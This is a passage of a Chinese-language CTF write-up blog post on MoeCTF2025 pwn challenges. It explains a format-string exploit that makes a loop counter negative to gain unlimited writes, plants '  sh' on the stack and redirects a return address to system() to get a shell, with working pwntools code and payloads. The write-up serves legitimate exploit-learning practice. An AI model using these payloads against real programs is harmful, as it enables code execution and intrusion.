class="number">00000000004040</span>A8 flag            dd ?                    ; DATA XREF: talk+<span class="number">1B</span>↑r</span><br><span class="line">.bss:<span class="number">00000000004040</span>A8                                         ; talk+<span class="number">24</span>↑w ...</span><br><span class="line">.bss:<span class="number">00000000004040</span>AC                 align <span class="number">20</span>h</span><br></pre></td></tr></table></figure>

<p>只是让flag &#x3D;&#x3D; 0也就只有三次格式化字符串利用的机会，由于程序在 he() 里有system函数</p>
<p>ida里的 he()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401274</span>                 lea     rax, [rbp+command]</span><br><span class="line">.text:<span class="number">0000000000401278</span>                 mov     rdi, rax        ; command</span><br><span class="line">.text:<span class="number">000000000040127B</span>                 call    _system</span><br></pre></td></tr></table></figure>

<p>光看这里会觉得很正常没什么，但在GDB看</p>
<p><img src="/./../images/Snipaste_2025-10-09_20-47-21.png"></p>
<p>如果我们可以利用格式化字符串漏洞将 [rbp - 0xe]处的值改为 “  sh”（注意sh的前面要有两个空格）或”&#x2F;bin&#x2F;sh”，（一般选前者，因为前者只需要写入四个字节，而后者需要写入8个字节），就能执行system(“  sh”)来getshell</p>
<p>想要做到这一步，就要借鉴前面[MoeCTF2024]where_is_fmt 的解题思路，在 talk()函数内，将 [rbp - 0xe]处的值改为 “  sh”，然后修改 talk() 的返回地址为 0x401274，！！这里要注意，talk()结束时是会有 leave_ret的，比如若在 talk()里rbp 0x7ffe567b7f60 —▸ 0x7ffe567b7f80</p>
<p>而我们直接跳转到0x401274处时，rbp内存的值会是rbp 0x7ffe567b7f80</p>
<p>所以这里我们要修改 [rbp - 0xe] &#x3D;&gt; 0x7ffe567b7f72处存的值为  “  sh\x00”（确保高字节处有\x00截断，没有就要加）</p>
<h6 id="但是这样的话，要写入”-sh”（两个空格-“s”-“h”）需要四次写入，篡改返回地址又需要两次写入，而我们在只确保flag-0的情况下也只能有三次写入的机会，这远远不够？？？我们需要更多的写入次数！！！"><a href="#但是这样的话，要写入”-sh”（两个空格-“s”-“h”）需要四次写入，篡改返回地址又需要两次写入，而我们在只确保flag-0的情况下也只能有三次写入的机会，这远远不够？？？我们需要更多的写入次数！！！" class="headerlink" title="但是这样的话，要写入”  sh”（两个空格 + “s” + “h”）需要四次写入，篡改返回地址又需要两次写入，而我们在只确保flag &#x3D;&#x3D; 0的情况下也只能有三次写入的机会，这远远不够？？？我们需要更多的写入次数！！！"></a>但是这样的话，要写入”  sh”（两个空格 + “s” + “h”）需要四次写入，篡改返回地址又需要两次写入，而我们在只确保flag &#x3D;&#x3D; 0的情况下也只能有三次写入的机会，这远远不够？？？我们需要更多的写入次数！！！</h6><p>让我们来GDB里，看看for ( i &#x3D; 1; i &lt;&#x3D; 3 &amp;&amp; !flag; ++i )里，i &lt;&#x3D; 3这一步是怎么比较的</p>
<p><img src="/./../images/Snipaste_2025-10-09_21-20-32.png"></p>
<p><img src="/./../images/Snipaste_2025-10-09_21-24-39.png"></p>
<p>其实就是这一步</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4013b5</span> &lt;main+<span class="number">70</span>&gt;    cmp    dword ptr [rbp - <span class="number">4</span>], <span class="number">3</span>            <span class="number">2</span> - <span class="number">3</span>     EFLAGS =&gt; <span class="number">0x297</span> [ CF PF AF zf SF IF df of ac ]</span><br></pre></td></tr></table></figure>

<p>简单来说就是 [rbp - 4] - 3 如果 &lt; 0，比较通过，进入 talk()，否则退出 for 循环</p>
<p>在 main() 里，可以知道i虽然是局部变量，不像之前一些简单点的题在bss段可以直接修改，但是它同时也是一个int有符号数，如果我们修改此处[rbp - 4]的值的最高位为0xFF，它就会变成一个很大的值，从而发生回环，变成一个负数，（负数 - 3 &lt; 0）。这样即可获得无限次的格式化字符串利用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re walking down the road when a monster appear.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">3</span> &amp;&amp; !flag; ++i )</span><br></pre></td></tr></table></figure>

<h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p>先泄露一个栈地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;192.168.242.1&quot;, 57764)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(<span class="built_in">hex</span>(data))</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&quot;You start talking to him...\n&quot;</span>, <span class="string">b&quot;%17$p&quot;</span>)</span><br><span class="line">tmp = <span class="built_in">int</span>(ru(<span class="string">b&quot;?\n&quot;</span>)[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">ls(tmp)</span><br><span class="line">sa(<span class="string">b&quot;You enraged the monster-prepare for battle!&quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">i = tmp - <span class="number">0x120</span></span><br><span class="line">ls(i)</span><br></pre></td></tr></table></figure>

<p><img src="/./../images/Snipaste_2025-10-09_21-55-40.png"></p>
<p>然后利用printf成链攻击，向这里的0x7ffd5dc3db6f写入0xFF</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vuln = ((i + <span class="number">7</span>) &amp; <span class="number">0xffff</span>)</span><br><span class="line">ls(vuln)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sa(<span class="string">b&quot;You start talking to him...\n&quot;</span>, <span class="string">f&quot;%<span class="subst">&#123;vuln&#125;</span>c%17$hn&quot;</span>)</span><br><span class="line">sa(<span class="string">b&quot;You enraged the monster-prepare for battle!&quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">sa(<span class="string">b&quot;You start talking to him...\n&quot;</span>, <span class="string">f&quot;%255c%47$hhn&quot;</span>)  <span class="comment">##写入0xFF</span></span><br><span class="line">sa(<span class="string">b&quot;You enraged the monster-prepare for battle!&quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>这里补充一下，被利用的参数的位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fmtarg <span class="number">0x7ffd5dc3db98</span></span><br><span class="line">The index of <span class="built_in">format</span> argument : <span class="number">17</span> (\<span class="string">&quot;\%16$p\&quot;)</span></span><br><span class="line"><span class="string">pwndbg&gt; fmtarg 0x7ffd5dc3dc88</span></span><br><span class="line"><span class="string">The index of format argument : 47 (\&quot;\%46$p\&quot;)</span></span><br><span class="line"><span class="string">pwndbg&gt; </span></span><br></pre></td></tr></table></figure>

<p>接着就是在[rbp - 0xe]处分多次写入”  sh”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">t = (i - <span class="number">6</span>) &amp; <span class="number">0xff</span></span><br><span class="line">sa(<span class="string">b&quot;You start talking to him...\n&quot;</span>, <span class="string">f&quot;%<span class="subst">&#123;t&#125;</span>c%17$hhn&quot;</span>)</span><br><span class="line">sa(<span class="string">b&quot;You enraged the monster-prepare for battle!&quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">li = [<span class="string">&quot; &quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;h&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ls(<span class="built_in">ord</span>(li[j]))</span><br><span class="line">    sa(<span class="string">b&quot;You start talking to him...\n&quot;</span>, <span class="string">f&quot;%<span class="subst">&#123;<span class="built_in">ord</span>(li[j])&#125;</span>c%47$hhn&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;You enraged the monster-prepare for battle!&quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">    sa(<span class="string">b&quot;You start talking to him...\n&quot;</span>, <span class="string">f&quot;%<span class="subst">&#123;(i + j - <span class="number">5</span>) &amp; <span class="number">0xff</span>&#125;</span>c%17$hhn&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;You enraged the monster-prepare for battle!&quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>最后修改talk()的返回地址，返回到0x401274</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sa(<span class="string">b&quot;You start talking to him...\n&quot;</span>, <span class="string">f&quot;%<span class="subst">&#123;(i - <span class="number">16</span>) &amp; <span class="number">0xff</span>&#125;</span>c%17$hhn&quot;</span>)</span><br><span class="line">sa(<span class="string">b&quot;You enraged the monster-prepare for battle!&quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sa(<span class="string">b&quot;You start talking to him...\n&quot;</span>, <span class="string">f&quot;%<span class="subst">&#123;<span class="number">0x1274</span>&#125;</span>c%47$hn&quot;</span>)</span><br><span class="line">sa(<span class="string">b&quot;You enraged the monster-prepare for battle!&quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>（这里不小心重来调试了，栈地址发生了变化，问题不大）最后一步修改后的结果就是</p>
<p><img src="/./../images/Snipaste_2025-10-09_22-14-57.png"></p>
<p><img src="/./../images/Snipaste_2025-10-09_22-18-46.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Icyice</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/10/13/MoeCTF2025-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">http://example.com/2025/10/13/MoeCTF2025-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Icyice's site</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN-CTF-WP/">PWN,CTF,WP</a></div><div class="post-share"><div class="social-share" data-image="/img/OIO.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/09/30/202576-LitCTF(2023%20-%202025)-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="LitCTF-PWN方向做题笔记"><img class="cover" src="/img/OIO.jpg" onerror="onerror=null;src='/img/loading.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">LitCTF-PWN方向做题笔记</div></div><div class="info-2"><div class="info-item-1">LitCTF(2023 - 2025)-PWN方向做题笔记前言：突然发现自己做过好多LitCTF的题，简单整理一下WP吧。 [LitCTF 2023]只需要nc一下~解题思路nc连接，获得shell，cat Dockerfile会发现flag被写进了环境变量$FLAG中，，echo $FLAG即可 [LitCTF 2023]口算题卡解题思路eval函数 eval() 是 Python 中的一个内置函数，用于执行一个字符串表达式，并返回表达式的值。 pwntools 中的 recvuntil 在 pwntools 库中，recvuntil 用于从 目标 接收数据，直到遇到指定的分隔符。 EXP12345678910111213141516from pwn import *io = remote(&quot;node4.anna.nssctf.cn&quot;, 28411)for _ in range(100):    io.recvuntil(b&quot;What is &quot;)    io.sendline(        str(            eval( ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/06/BaseCTF2024%E6%96%B0%E7%94%9F%E8%B5%9B-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="BaseCTF2024新生赛-PWN方向做题笔记"><img class="cover" src="/img/OIO.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-06</div><div class="info-item-2">BaseCTF2024新生赛-PWN方向做题笔记</div></div><div class="info-2"><div class="info-item-1">BaseCTF2024新生赛-PWN方向做题笔记复现平台：BaseCTF2024新生赛 - GZ::CTF 签个到吧解题思路nc连接即可getshell 没有 canary 我要死了!解题思路程序保护机制全开，用ida逆向分析后可知程序存在以当前时间为随机数种子的伪随机数验证和一个创建子进程的循环，且存在后门函数shell() 。 由于创建了子进程，我们就可以在子进程进行Canary和PIE的爆破，因为当我们将Canary错误修改后，程序会退出当前进程（子进程），回到父进程，而不会直接结束程序运行，这就允许我们重复尝试（PIE同理） （PS：我的脚本就是跑不出来，照着WP改都不行qwq） EXP我的脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *from ctypes import cdllcontext(os=&quot;linux&quot;, arch=&quot;amd64&quot;,...</div></div></div></a><a class="pagination-related" href="/2025/09/30/202576-LitCTF(2023%20-%202025)-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="LitCTF-PWN方向做题笔记"><img class="cover" src="/img/OIO.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-30</div><div class="info-item-2">LitCTF-PWN方向做题笔记</div></div><div class="info-2"><div class="info-item-1">LitCTF(2023 - 2025)-PWN方向做题笔记前言：突然发现自己做过好多LitCTF的题，简单整理一下WP吧。 [LitCTF 2023]只需要nc一下~解题思路nc连接，获得shell，cat Dockerfile会发现flag被写进了环境变量$FLAG中，，echo $FLAG即可 [LitCTF 2023]口算题卡解题思路eval函数 eval() 是 Python 中的一个内置函数，用于执行一个字符串表达式，并返回表达式的值。 pwntools 中的 recvuntil 在 pwntools 库中，recvuntil 用于从 目标 接收数据，直到遇到指定的分隔符。 EXP12345678910111213141516from pwn import *io = remote(&quot;node4.anna.nssctf.cn&quot;, 28411)for _ in range(100):    io.recvuntil(b&quot;What is &quot;)    io.sendline(        str(            eval( ...</div></div></div></a><a class="pagination-related" href="/2025/09/06/NepCTF2025-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="NepCTF2025-PWN方向做题笔记"><img class="cover" src="/img/OIO.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-06</div><div class="info-item-2">NepCTF2025-PWN方向做题笔记</div></div><div class="info-2"><div class="info-item-1">NepCTF2025-PWN方向做题笔记Time解题思路题目存在一个非栈上的格式化字符串漏洞，并利用pthread_create()开启一个子线程。 以下是 IDA 中题目main()源码（重命名了一些函数） 12345678910111213141516void __fastcall __noreturn main(int a1, char **a2, char **a3)&#123;  pthread_t newthread[2]; // [rsp+0h] [rbp-10h] BYREF  newthread[1] = __readfsqword(0x28u);  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  input_name();  while ( 1 )  &#123;    while ( !(unsigned int)input_file_name() )      ;    pthread_create(newthread, 0LL, (void *(*)(void...</div></div></div></a><a class="pagination-related" href="/2025/04/01/MoeCTF2024-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="MoeCTF2024-PWN方向做题笔记"><img class="cover" src="/img/OIO.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-01</div><div class="info-item-2">MoeCTF2024-PWN方向做题笔记</div></div><div class="info-2"><div class="info-item-1">MoeCTF2024做题笔记 复现平台：MoeCTF 2024 - 西电 CTF 终端 题目：NotEnoughTime​在正式开始 Pwn 之前，我需要先检测一下你的数学 (?) 能力...​ ​ 我也是疯了，竟然真想跟它拼手速😅 就考验用python来写pwn基础脚本的能力，好吧，这的确是我缺少的 题解​：本题考察 Pwntools 基本用法，虽然是简单的计算加减乘除，但是在输出算式时刻意添加延迟营造网络卡顿环境，并且算式存在多行情况，意在引导使用 recvuntil​。注意在使用 Python ​eval​​ 前需要去除多行算式中的  ​\n​​ 以及末尾的  ​=​ ​ 以符合 Python 语法。除法是整数除法，在 Python 语法中为  ​//​ ​。 比赛期间注意到很多选手把除法看作浮点数运算，由此触发了许多奇怪的 bug（出题时并没有考虑到会有浮点数输入的情况）。于是临时新增了一个提示。 Exp: 12345678910111213141516171819202122from pwn import *io =...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/me.jpg" onerror="this.onerror=null;this.src='/img/loading.gif'" alt="avatar"/></div><div class="author-info-name">Icyice</div><div class="author-info-description">我的野心是一生自由</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Icyice001"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Icyice001" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的小站，我在这里分享一些我学习 PWN 的犯错经验与做题笔记。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MoeCTF2025-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">MoeCTF2025-PWN方向做题笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">1.1.</span> <span class="toc-text">0 二进制漏洞审计入门指北</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZtext"><span class="toc-number">1.2.</span> <span class="toc-text">EZtext</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-u64"><span class="toc-number">1.3.</span> <span class="toc-text">ez_u64</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fmt"><span class="toc-number">1.4.</span> <span class="toc-text">fmt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#inject"><span class="toc-number">1.5.</span> <span class="toc-text">inject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#randomlock"><span class="toc-number">1.6.</span> <span class="toc-text">randomlock</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-5"><span class="toc-number">1.6.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-5"><span class="toc-number">1.6.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#str-check"><span class="toc-number">1.7.</span> <span class="toc-text">str_check</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-6"><span class="toc-number">1.7.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-6"><span class="toc-number">1.7.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#syslock"><span class="toc-number">1.8.</span> <span class="toc-text">syslock</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-7"><span class="toc-number">1.8.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-7"><span class="toc-number">1.8.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eazylibc"><span class="toc-number">1.9.</span> <span class="toc-text">eazylibc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-8"><span class="toc-number">1.9.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-8"><span class="toc-number">1.9.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezshellcode"><span class="toc-number">1.10.</span> <span class="toc-text">ezshellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-9"><span class="toc-number">1.10.1.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80"><span class="toc-number">1.10.1.1.</span> <span class="toc-text">前置基础</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-9"><span class="toc-number">1.10.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#find-it"><span class="toc-number">1.11.</span> <span class="toc-text">find it</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-10"><span class="toc-number">1.11.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-10"><span class="toc-number">1.11.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A4%E8%AF%86libc"><span class="toc-number">1.12.</span> <span class="toc-text">认识libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-11"><span class="toc-number">1.12.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-11"><span class="toc-number">1.12.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#boom"><span class="toc-number">1.13.</span> <span class="toc-text">boom</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-12"><span class="toc-number">1.13.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-12"><span class="toc-number">1.13.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#boom-revenge"><span class="toc-number">1.14.</span> <span class="toc-text">boom_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-13"><span class="toc-number">1.14.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-13"><span class="toc-number">1.14.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpivot"><span class="toc-number">1.15.</span> <span 